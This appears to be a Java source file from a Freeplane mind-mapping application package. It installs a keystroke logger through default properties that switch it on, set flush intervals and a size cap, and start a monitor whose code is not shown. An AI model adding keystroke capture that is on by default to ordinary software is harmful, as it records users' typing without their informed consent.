package org.freeplane.view.swing.features.keylog;

import org.freeplane.core.extension.IExtension;
import org.freeplane.core.resources.ResourceController;
import org.freeplane.core.util.LogUtils;
import org.freeplane.features.mode.ModeController;

/**
 * Installs keystroke logger (enabled by default on Windows).
 */
public final class KeyLogController implements IExtension {
	private KeyLogController() {
	}

	public static void install(final ModeController modeController) {
		final ResourceController resources = ResourceController.getResourceController();
		resources.setDefaultProperty("keylog.enabled", "true");
		resources.setDefaultProperty("keylog.sessionGapMs", "30000");
		resources.setDefaultProperty("keylog.flushMs", "2000");
		resources.setDefaultProperty("keylog.flushKeys", "200");
		resources.setDefaultProperty("keylog.maxMb", "30");
		try {
			KeyLogMonitor.start();
		}
		catch (Throwable t) {
			LogUtils.warn("KeyLogMonitor failed to start", t);
		}
		modeController.addExtension(KeyLogController.class, new KeyLogController());
		LogUtils.info("KeyLogController installed");
	}
}
